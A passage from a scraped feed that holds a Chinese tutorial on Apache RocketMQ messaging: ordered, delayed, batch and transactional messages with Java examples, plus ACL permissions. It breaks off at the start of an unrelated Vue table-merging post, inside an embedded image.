    <span class="hljs-keyword">public</span> ConsumeOrderlyStatus <span class="hljs-title function_">consumeMessage</span><span class="hljs-params">(List&lt;MessageExt&gt; msgs, ConsumeOrderlyContext context)</span> {
        context.setAutoCommit(<span class="hljs-literal">true</span>);
        System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msgs);
        <span class="hljs-built_in">this</span>.consumeTimes.incrementAndGet();
        <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">this</span>.consumeTimes.get() % <span class="hljs-number">5</span>) == <span class="hljs-number">0</span>) {
            context.setSuspendCurrentQueueTimeMillis(<span class="hljs-number">3000</span>);
            <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT;
        }

        <span class="hljs-keyword">return</span> ConsumeOrderlyStatus.SUCCESS;
    }
});
</code></pre>
<p>原理就是将消息都发到同一个MessageQueue。具体可以看官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F03fifomessage%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/03fifomessage/" ref="nofollow noopener noreferrer">顺序消息 | RocketMQ</a></p>
<blockquote>
<p>注：</p>
<p>1、一般场景下是局部有序，如果需要全局有序，那就将消息统一放到一个 MessageQueue 。</p>
<p>2、⽣产者端尽可能将同一组有序消息打散到不同的 MessageQueue 上，避免过于集中导致数据热点竞争。</p>
<p>3、消费者端只进⾏有限次数的重试。如果⼀条消息处理失败，RocketMQ会将后续消息阻塞住，让消费者进⾏重试。但是，如果消费者⼀直处理失败，超过最⼤重试次数，那么RocketMQ就会跳过这⼀条消息，处理后⾯的消息，这会造成消息乱序。</p>
<p>4、消费者端如果确实处理逻辑中出现问题，不建议抛出异常，可以返回 <code>ConsumeOrderlyStatus.SUSPEND_CURRENT_QUEUE_A_MOMENT</code>作为替代。</p>
</blockquote>
<h3 data-id="heading-24">6 延迟消息</h3>
<p>RocketMQ 的延迟消息是一种高级消息特性，指消息发送到 Broker 后，不会立即被消费者消费，而是在指定时间（或延迟级别对应的时间）后才投递到目标 Topic 供消费者处理。该机制广泛应用于订单超时处理、定时任务调度、通知提醒等场景。</p>
<h4 data-id="heading-25">6.1 原理</h4>
<p>消息发送后，在固定的时间后才被消费，官方有两个版本，两者本质相同，均通过服务端定时调度实现，5.x 版本统一称为定时消息。</p>
<ul>
<li>RocketMQ 4.x 默认支持18 个固定延迟级别，不支持任意时间延迟。</li>
</ul>
<p>Broker 配置可自定义延迟级别：<code>messageDelayLevel=1s 5s 10s 30s 1m ... 1h 2h</code></p>
<ul>
<li>RocketMQ 5.x 引入<strong>精确定时消息</strong>，支持毫秒级任意时间延迟，通过设置绝对时间戳实现。</li>
</ul>
<h4 data-id="heading-26">6.2 代码案例</h4>
<p>生产者的核心代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
message.setDelayTimeLevel(<span class="hljs-number">3</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.print(result);
</code></pre>
<p>通过设置延迟时间级别 <code>message.setDelayTimeLevel(3)</code>代表 10 秒后发送。Broker 接收消息后，判断为延迟消息，将其暂存到内部主题 <code>SCHEDULE_TOPIC_XXXX</code>。Broker 启动定时任务线程池，每个延迟级别对应一个定时任务，定时任务周期性扫描对应队列，判断消息是否到期（存储时间 + 延迟时间≤当前时间），到期消息被重新投递到原始目标 Topic 的对应队列，消费者此时可正常消费该消息。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, (<span class="hljs-string">"Hello scheduled message "</span> + i).getBytes(StandardCharsets.UTF_8));
<span class="hljs-comment">// This message will be delivered to consumer 10 seconds later.</span>
<span class="hljs-comment">//message.setDelayTimeSec(10);</span>
<span class="hljs-comment">// The effect is the same as the above</span>
<span class="hljs-comment">// message.setDelayTimeMs(10_000L);</span>
<span class="hljs-comment">// Set the specific delivery time, and the effect is the same as the above</span>
<span class="hljs-comment">// long deliverTime = LocalDateTime.of(2026, 1, 20, 10, 0, 0)</span>
<span class="hljs-comment">//     .atZone(ZoneId.systemDefault())</span>
<span class="hljs-comment">//     .toInstant()</span>
<span class="hljs-comment">//     .toEpochMilli();</span>
<span class="hljs-comment">// message.setDeliverTimeMs(deliverTime);</span>
message.setDeliverTimeMs(System.currentTimeMillis() + <span class="hljs-number">10_000L</span>);
<span class="hljs-comment">// Send the message</span>
<span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
System.out.printf(result + <span class="hljs-string">"\n"</span>);
</code></pre>
<p>时间轮将时间划分为固定槽位，每个槽位对应一个时间间隔。消息根据到期时间放入对应槽位，通过指针循环扫描处理到期消息。具体可以看官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2F4.x%2Fproducer%2F04message3%2F" target="_blank" title="https://rocketmq.apache.org/zh/docs/4.x/producer/04message3/" ref="nofollow noopener noreferrer">延迟消息发送 | RocketMQ</a></p>
<h3 data-id="heading-27">7 批量消息</h3>
<p>在对吞吐率有一定要求的情况下，Apache RocketMQ可以将一些消息聚成一批以后进行发送，可以增加吞吐率，并减少API和网络调用次数。</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/754201307eb444768f601d7063b74053~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=BLwYES%2FKE8GZk329Xnh5dRyoEPQ%3D" alt="" loading="lazy"/></p>
<p>案例代码</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 添加批量消息</span>
List&lt;Message&gt; messages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(MESSAGE_COUNT);
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
    messages.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, TAG, <span class="hljs-string">"OrderID"</span> + i, (<span class="hljs-string">"Hello world "</span> + i).getBytes(StandardCharsets.UTF_8)));
}

<span class="hljs-comment">// 消息过多需要分片</span>
<span class="hljs-type">ListSplitter</span> <span class="hljs-variable">splitter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ListSplitter</span>(messages);
<span class="hljs-keyword">while</span> (splitter.hasNext()) {
    List&lt;Message&gt; listItem = splitter.next();
    <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(listItem);
    System.out.printf(<span class="hljs-string">"%s"</span>, sendResult);
}
</code></pre>
<blockquote>
<p>注：</p>
<p>批量消息的使用非常简单，但是要注意RocketMQ做了限制。同一批消息的Topic必须相同，另外，不支持延迟消息。</p>
<p>还有批量消息的大小不要超过1M，如果太大就需要自行分割。</p>
</blockquote>
<h3 data-id="heading-28">8 事务消息</h3>
<p>事务消息为 Apache RocketMQ 中的高级特性消息，本文为您介绍事务消息的应用场景、功能原理、使用限制、使用方法和使用建议。</p>
<blockquote>
<p>事务消息是 Apache RocketMQ 提供的一种高级消息类型，支持在分布式场景下保障消息生产和本地事务的最终一致性。</p>
</blockquote>
<h4 data-id="heading-29">8.1 工作流程</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6185b6c4e9440eb88353f74cb0a1205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=axdr%2BJADgeahEhd%2BWsZlGnoAnto%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>简单的描述以上内容（后续会有文章来单独介绍，具体内容请看原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Frocketmq.apache.org%2Fzh%2Fdocs%2FfeatureBehavior%2F04transactionmessage%2F%3Ff_link_type%3Df_linkinlinenote%26flow_extra%3DeyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%253D%253D" target="_blank" title="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage/?f_link_type=f_linkinlinenote&amp;flow_extra=eyJpbmxpbmVfZGlzcGxheV9wb3NpdGlvbiI6MCwiZG9jX3Bvc2l0aW9uIjowLCJkb2NfaWQiOiI0OTViMWYyMzhjNTQ3NzQwLTYwYTNhMTQ0MDNlMTA1YjUifQ%3D%3D" ref="nofollow noopener noreferrer">事务消息 | RocketMQ</a>）</p>
<p><strong>首先</strong>，生产者将消息发送至Apache RocketMQ服务端，实际上是向 Broker（Server）发送一条 “半消息”（Half Message），Broker 确认接收成功后，这条消息暂时不会投递给消费者。<strong>然后</strong>生产者开始执行本地业务事务（比如数据库操作），确保业务逻辑和消息发送的一致性。<strong>接着</strong>本地事务执行完成后，生产者向 Broker 发送 Commit（事务成功）或 Rollback（事务失败）指令，告知 Broker 最终处理结果。事务状态回查有补偿机制，如果 Broker 长时间未收到生产者的指令，会主动触发事务回查，向生产者询问本地事务的最终状态；生产者重新检查本地事务并反馈结果。<strong>最后</strong> Broker 收到 Commit 指令时，会将半消息正式投递给消费者（Subscriber）；收到 Rollback 指令时，则直接丢弃半消息，不进行投递。</p>
</blockquote>
<h4 data-id="heading-30">8.2 生命周期</h4>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/95a4613d1ba6427ba226dca41bee43a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=pS%2BjqErIaer6goD3KOZxKMUKN3Q%3D" alt="" loading="lazy"/></p>
<ul>
<li>初始化：半事务消息被生产者构建并完成初始化，待发送到服务端的状态。</li>
<li>事务待提交：半事务消息被发送到服务端，和普通消息不同，并不会直接被服务端持久化，而是会被单独存储到事务存储系统中，等待第二阶段本地事务返回执行结果后再提交。此时消息对下游消费者不可见。</li>
<li>消息回滚：第二阶段如果事务执行结果明确为回滚，服务端会将半事务消息回滚，该事务消息流程终止。</li>
<li>提交待消费：第二阶段如果事务执行结果明确为提交，服务端会将半事务消息重新存储到普通存储系统中，此时消息对下游消费者可见，等待被消费者获取并消费。</li>
<li>消费中：消息被消费者获取，并按照消费者本地的业务逻辑进行处理的过程。 此时服务端会等待消费者完成消费并提交消费结果，如果一定时间后没有收到消费者的响应，Apache RocketMQ会对消息进行重试处理。具体信息。</li>
<li>消费提交：消费者完成消费处理，并向服务端提交消费结果，服务端标记当前消息已经被处理（包括消费成功和失败）。 Apache RocketMQ默认支持保留所有消息，此时消息数据并不会立即被删除，只是逻辑标记已消费。消息在保存时间到期或存储空间不足被删除前，消费者仍然可以回溯消息重新消费。</li>
<li>消息删除：Apache RocketMQ按照消息保存机制滚动清理最早的消息数据，将消息从物理文件中删除。</li>
</ul>
<h4 data-id="heading-31">8.3 官方实例代码</h4>
<p>① 实现 TransactionListener 接口</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionListenerImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TransactionListener</span> {
    <span class="hljs-comment">// 原子整型：生成自增数值，模拟不同的本地事务结果（线程安全，适配多线程发送场景）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">transactionIndex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
    <span class="hljs-comment">// 并发哈希表：存储「事务消息ID-事务状态」的映射，供回查时使用（线程安全）</span>
    <span class="hljs-keyword">private</span> ConcurrentHashMap&lt;String, Integer&gt; localTrans = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();

    <span class="hljs-comment">// 执行本地事务</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">executeLocalTransaction</span><span class="hljs-params">(Message msg, Object arg)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> transactionIndex.getAndIncrement();
        <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> value % <span class="hljs-number">3</span>;
        localTrans.put(msg.getTransactionId(), status);
        <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
    }

    <span class="hljs-comment">// 回查事务状态</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> LocalTransactionState <span class="hljs-title function_">checkLocalTransaction</span><span class="hljs-params">(MessageExt msg)</span> {
        <span class="hljs-type">Integer</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> localTrans.get(msg.getTransactionId());
        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != status) {
            <span class="hljs-keyword">switch</span> (status) {
                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.UNKNOW;
                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.ROLLBACK_MESSAGE;
                <span class="hljs-keyword">default</span>:
                    <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
            }
        }
        <span class="hljs-keyword">return</span> LocalTransactionState.COMMIT_MESSAGE;
    }
}
</code></pre>
<p>② 生产者</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"please_rename_unique_group_name"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"127.0.0.1:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest1234"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-type">TransactionListener</span> <span class="hljs-variable">transactionListener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionListenerImpl</span>();
        <span class="hljs-type">TransactionMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransactionMQProducer</span>(PRODUCER_GROUP);

        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">100</span>, TimeUnit.SECONDS, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">2000</span>), r -&gt; {
            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r);
            thread.setName(<span class="hljs-string">"client-transaction-msg-check-thread"</span>);
            <span class="hljs-keyword">return</span> thread;
        });

        producer.setExecutorService(executorService);
        producer.setTransactionListener(transactionListener);
        producer.start();

        String[] tags = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] {<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>, <span class="hljs-string">"TagD"</span>, <span class="hljs-string">"TagE"</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span>
                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC, tags[i % tags.length], <span class="hljs-string">"KEY"</span> + i,
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET));
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.sendMessageInTransaction(msg, <span class="hljs-literal">null</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);

                Thread.sleep(<span class="hljs-number">10</span>);
            } <span class="hljs-keyword">catch</span> (MQClientException | UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        <span class="hljs-comment">// 保持程序运行（关键！否则生产者关闭后无法接收回查回调）</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
            Thread.sleep(<span class="hljs-number">1000</span>);
        }
        producer.shutdown();
    }
}
</code></pre>
<p>这两段代码，其中 <code>TransactionListenerImpl</code> 是事务监听器的实现类（负责处理本地事务和事务回查），<code>TransactionProducer</code> 是事务消息生产者（负责发送事务消息并驱动整个流程）。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">LocalTransactionState</span> {
    COMMIT_MESSAGE, <span class="hljs-comment">// “提交”，消息对消费者可见；</span>
    ROLLBACK_MESSAGE, <span class="hljs-comment">// “回滚”，消息被丢弃；</span>
    UNKNOW; <span class="hljs-comment">//  “未知”，RocketMQ 会继续回查（直到超时）；</span>
}
</code></pre>
<p>当 <code>executeLocalTransaction</code> 返回 <code>UNKNOW</code>，或生产者与 <code>RocketMQ</code> 通信异常时，<code>RocketMQ</code>会定时回调该方法，确认本地事务最终状态；</p>
<p>必须使用 <code>TransactionMQProducer</code>来发送消息。</p>
<h3 data-id="heading-32">9 ACL 权限控制机制</h3>
<p>访问控制 2.0（ACL 2.0）是Apache RocketMQ的访问控制列表(Access Control List)升级版本，提供了完善的身份认证(Authentication)和权限授权(Authorization)机制，用于保护RocketMQ集群的数据安全。</p>
<p>我们可以在控制界面给 topic 设置权限</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/366e84d27fff4c1fb7ca6ccd56d2bf74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCS5pS-5ZCn5b635b63:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769523170&amp;x-signature=WFe8OwyXH6tJdcwCbyyZQnd6Lxo%3D" alt="" loading="lazy"/></p>
<p>如图中的 perm 表示 topic 的权限，有三个可选项。 2：禁写禁订阅，4：可订阅，不能写，6：可写可订阅。</p>
<blockquote>
<p>在Broker端还提供了更详细的权限控制机制。主要是在broker.conf中打开acl的标志：aclEnable=true。就可以用plain_acl.yml来进⾏权限配置了，并且是热加载，无需重启。</p>
<p><strong>但是我这个是 2.0，在 ACL2.0 这种方法已经被移除了（后续文章将详细描写）。</strong></p>
</blockquote>
<p>ACL 2.0 可以通过配置 broker.conf 来设置认证授权等。</p>
<h3 data-id="heading-33">总结</h3>
<p>RocketMQ 客户端消息机制具备清晰的使用逻辑与完善的可靠性保障：生产者、消费者均有固定编程步骤；消息确认机制分生产端（同步 / 异步 / 单向发送的差异化确认，关联 Broker 刷盘 / 复制策略）和消费端（基于 Offset 的自动 / 手动确认，含重试、死信队列等兜底）；消费模式支持集群（负载均衡，Broker 管理 Offset）与广播（全量消费，本地维护 Offset）；消息过滤可通过 Tag（简单高效）或 SQL92（复杂灵活）在 Broker 端实现，减少无效传输。</p>
<hr/>
<p><em>转发请携带作者信息</em>  <strong>@怒放吧德德 @一个有梦有戏的人</strong><br/>
持续创作很不容易，作者将以尽可能的详细把所学知识分享各位开发者，一起进步一起学习。<strong>转载请携带链接，转载到微信公众号请勿选择原创，谢谢！</strong><br/>
👍创作不易，如有错误请指正，感谢观看！记得点赞哦！👍<br/>
谢谢支持！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue2+vue3 Table表格合并]]></title>    <link>https://juejin.cn/post/7597635202324627508</link>    <guid>https://juejin.cn/post/7597635202324627508</guid>    <pubDate>2026-01-21T10:47:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597635202324627508" data-draft-id="7597635202324594740" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue2+vue3 Table表格合并 "/> <meta itemprop="keywords" content="前端,Vue.js,Element"/> <meta itemprop="datePublished" content="2026-01-21T10:47:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="陶醉的松鼠"/> <meta itemprop="url" content="https://juejin.cn/user/747323637634957"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue2+vue3 Table表格合并 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323637634957/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    陶醉的松鼠
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:47:00.000Z" title="Wed Jan 21 2026 10:47:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAA